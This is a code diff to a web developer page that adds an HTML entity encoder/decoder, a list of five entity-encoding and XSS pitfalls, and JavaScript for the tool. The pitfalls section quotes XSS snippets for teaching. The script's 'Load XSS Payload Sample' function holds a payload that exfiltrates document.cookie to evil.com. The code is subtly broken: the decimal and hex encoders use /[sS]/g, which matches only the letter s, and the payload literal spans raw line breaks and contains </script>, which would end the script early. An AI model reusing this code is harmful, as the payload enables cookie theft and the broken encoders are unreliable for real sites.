@@ -1040,19 +1040,169 @@
       @media (max-width: 768px) { .grid-2col { grid-template-columns: 1fr; } }
     </style>
   
-        <div class="article-container" style="max-width: 900px;">
+        <div class="article-container" style="max-width: 920px;">
           <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
             <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; HTML Entity Encoder
           </nav>
-          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">HTML Entity Encoder & Decoder</h1>
+          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">HTML Entity Encoder &amp; Decoder Studio</h1>
+          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
+            Convert reserved HTML characters, symbols, and Unicode strings into named, decimal, or hexadecimal entities and decode them safely.
+          </p>
+
           <div class="tool-box">
-            <textarea id="ent-in" class="code-input" style="height: 120px;" placeholder="<div class=&quot;box&quot;>Hello & welcome!</div>"></textarea>
-            <div class="action-bar">
-              <button class="btn-primary" onclick="document.getElementById('ent-in').value=document.getElementById('ent-in').value.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;')">Encode Entities</button>
-              <button class="btn-sec" onclick="const ta=document.createElement('textarea'); ta.innerHTML=document.getElementById('ent-in').value; document.getElementById('ent-in').value=ta.value;">Decode Entities</button>
+            <div class="field-group">
+              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.35rem;">
+                <label class="field-label" style="margin: 0;">Input Text or HTML</label>
+                <button type="button" class="btn-sec" style="font-size: 0.72rem; padding: 0.2rem 0.5rem;" onclick="loadXssPayloadSample()">Load XSS Payload Sample</button>
+              </div>
+              <textarea id="ent-in" class="code-input" style="height: 120px;" placeholder='<div class="banner">Hello &amp; welcome to "Digital Tools Shed" &lt;2026&gt;!</div>'></textarea>
+            </div>
+
+            <!-- Mode Selector Bar -->
+            <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin: 1rem 0;">
+              <button type="button" class="btn-primary" onclick="entityTransform('named')">Encode Named Entities (&amp;amp; &amp;lt;)</button>
+              <button type="button" class="btn-sec" onclick="entityTransform('decimal')">Encode Decimal (&#38;)</button>
+              <button type="button" class="btn-sec" onclick="entityTransform('hex')">Encode Hexadecimal (&#x26;)</button>
+              <button type="button" class="btn-sec" onclick="entityTransform('decode')">Decode Entities to Text</button>
+              <button type="button" class="btn-sec" onclick="clearEntityInputs()">Clear</button>
+            </div>
+
+            <div class="field-group" style="margin-top: 1.25rem;">
+              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.35rem;">
+                <label class="field-label" style="margin: 0;">Output Result</label>
+                <span id="entMetrics" style="font-family: var(--mono); font-size: 0.75rem; color: var(--text-muted);">0 chars</span>
+              </div>
+              <textarea id="ent-out" class="code-input" style="height: 120px;" readonly></textarea>
+            </div>
+
+            <!-- Copy Button -->
+            <button type="button" id="btnCopyHtmlEntities" onclick="copyHtmlEntities()" class="btn-sec" style="margin-top: 1.25rem; width: 100%; padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
+              <span>📋 Copy Encoded / Decoded HTML Entities</span>
+            </button>
+          </div>
+
+          <!-- 5 Critical HTML Entity & Sanitization Traps -->
+          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
+            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in HTML Entities &amp; XSS Defense Architecture</h3>
+            <div style="display: grid; gap: 1rem;">
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. The Incomplete 5-Character Sanitization Fallacy</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  Escaping only the five canonical characters (<code>&amp; &lt; &gt; " '</code>) is insufficient to prevent Cross-Site Scripting (XSS) inside unquoted HTML attributes or JavaScript event handlers. Inside an unquoted attribute (<code>&lt;input value=${input}&gt;</code>), an attacker does not need quotes or angle brackets; a simple space or tab followed by <code>onfocus=alert(1) autofocus</code> achieves full script execution.
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. Double-Encoding Cascades (&amp;amp;amp; Pollution)</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  When user input is encoded during database storage and subsequently re-encoded during template rendering, ampersands compound exponentially: <code>&amp;copy;</code> becomes <code>&amp;amp;copy;</code>, displaying literal <code>&amp;copy;</code> code on screen instead of the copyright symbol. Applications should store unescaped canonical strings in the database and apply entity encoding exclusively at the final view rendering boundary.
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. Context Ineffectiveness in 'href' &amp; 'src' URI Attributes</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  HTML entity encoding does NOT sanitize URLs. If an attacker inputs <code>javascript:alert(document.cookie)</code> and you entity-encode it as <code>&lt;a link-url="&amp;#106;avascript:alert(1)"&gt;</code>, modern web browsers decode the HTML entities inside URI attributes BEFORE executing the link, resulting in instant XSS. URIs require strict protocol whitelisting (<code>http://</code>, <code>https://</code>).
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. DOM-Based XSS via 'innerHTML' Entity Decoding</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  A pervasive JavaScript antipattern decodes HTML entities by creating an off-screen element and setting <code>el.innerHTML = input</code> followed by reading <code>el.textContent</code>. If the input contains <code>&lt;img src=x onerror=alert(1)&gt;</code>, setting <code>innerHTML</code> immediately fires the <code>onerror</code> event in browser memory before the element is even attached to the DOM.
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. XML / SVG Parser Abort on HTML Named Entities</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  While HTML5 recognizes over 2,000 named entities (e.g. <code>&amp;nbsp;</code>, <code>&amp;euro;</code>, <code>&amp;mdash;</code>), strict XML, XHTML, and SVG engines only natively recognize five: <code>&amp;quot; &amp;amp; &amp;apos; &amp;lt; &amp;gt;</code>. Injecting <code>&amp;nbsp;</code> into an SVG or RSS feed causes XML parsers to abort with fatal <code>entity not defined</code> parsing errors.
+                </p>
+              </div>
             </div>
           </div>
         </div>
+
+        <script>
+          var entityMap = {
+            '&': '&amp;',
+            '<': '&lt;',
+            '>': '&gt;',
+            '"': '&quot;',
+            "'": '&#39;',
+            '`': '&#96;'
+          };
+
+          window.entityTransform = function(mode) {
+            var raw = (document.getElementById('ent-in') ? document.getElementById('ent-in').value : '');
+            var out = '';
+
+            if (mode === 'named') {
+              out = raw.replace(/[&<>"'`]/g, function(s) { return entityMap[s] || s; });
+            } else if (mode === 'decimal') {
+              out = raw.replace(/[sS]/g, function(ch) {
+                var code = ch.charCodeAt(0);
+                return (code < 32 || code > 126 || /[&<>"'`]/.test(ch)) ? '&#' + code + ';' : ch;
+              });
+            } else if (mode === 'hex') {
+              out = raw.replace(/[sS]/g, function(ch) {
+                var code = ch.charCodeAt(0);
+                return (code < 32 || code > 126 || /[&<>"'`]/.test(ch)) ? '&#x' + code.toString(16).toUpperCase() + ';' : ch;
+              });
+            } else if (mode === 'decode') {
+              // Safe entity decoding using DOMParser to prevent code execution
+              try {
+                var doc = new DOMParser().parseFromString('<!doctype html><body>' + raw, 'text/html');
+                out = doc.body.textContent || '';
+              } catch(e) {
+                out = raw.replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&#39;/g, "'");
+              }
+            }
+
+            document.getElementById('ent-out').value = out;
+            document.getElementById('entMetrics').textContent = out.length + ' chars';
+          };
+
+          window.clearEntityInputs = function() {
+            document.getElementById('ent-in').value = '';
+            document.getElementById('ent-out').value = '';
+            document.getElementById('entMetrics').textContent = '0 chars';
+          };
+
+          window.loadXssPayloadSample = function() {
+            var payload = '<div class="profile" data-user="admin"><script>alert(document.domain)</script>
+<a href="javascript:alert(1)" onclick="stealCookies()">Click Me & Win $1,000!</a>
+<img src="x" onerror="fetch('https://evil.com/leak?'+document.cookie)">';
+            document.getElementById('ent-in').value = payload;
+            entityTransform('named');
+          };
+
+          window.copyHtmlEntities = function() {
+            var out = document.getElementById('ent-out') ? document.getElementById('ent-out').value : '';
+            if (!out) {
+              entityTransform('named');
+              out = document.getElementById('ent-out').value;
+            }
+
+            navigator.clipboard.writeText(out).then(function() {
+              var btn = document.getElementById('btnCopyHtmlEntities');
+              if (btn) {
+                var orig = btn.innerHTML;
+                btn.innerHTML = '<span style="color:#10b981;">✓ HTML Entities Copied!</span>';
+                btn.style.borderColor = '#10b981';
+                setTimeout(function() {
+                  btn.innerHTML = orig;
+                  btn.style.borderColor = 'var(--border)';
+                }, 2200);
+              }
+            });
+          };
+
+          document.addEventListener('DOMContentLoaded', function() {
+            var inp = document.getElementById('ent-in');
+            if (inp && inp.value) entityTransform('named');
+          });
+        </script>
       
 
           
